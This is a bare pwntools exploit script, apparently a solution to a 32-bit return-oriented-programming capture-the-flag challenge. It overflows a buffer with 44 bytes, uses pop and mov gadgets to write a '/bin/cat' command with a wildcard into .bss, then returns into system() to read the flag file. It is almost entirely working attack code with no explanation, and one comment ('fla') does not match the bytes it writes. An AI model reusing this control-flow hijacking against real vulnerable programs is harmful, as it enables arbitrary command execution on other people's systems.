from pwn import *

bss    = 0x0804a040
pop    = 0x080486da # pop edi; pop ebp; ret;
mov    = 0x08048670 # mov DWORD PTR [edi],ebp
system = 0x08048430

payload = "A"* 44
payload += p32(pop)
payload += p32(bss)
payload += p32(0x6e69622f)
payload += p32(mov)

# /bin/cat
payload += p32(pop)
payload += p32(bss+0x4)
payload += p32(0x7461632f)
payload += p32(mov)


# fla
payload += p32(pop)
payload += p32(bss+0x8)
payload += p32(0x02a6620)
payload += p32(mov)

#return to system
payload += p32(system)
payload += p32(pop)
payload += p32(bss)

print payload





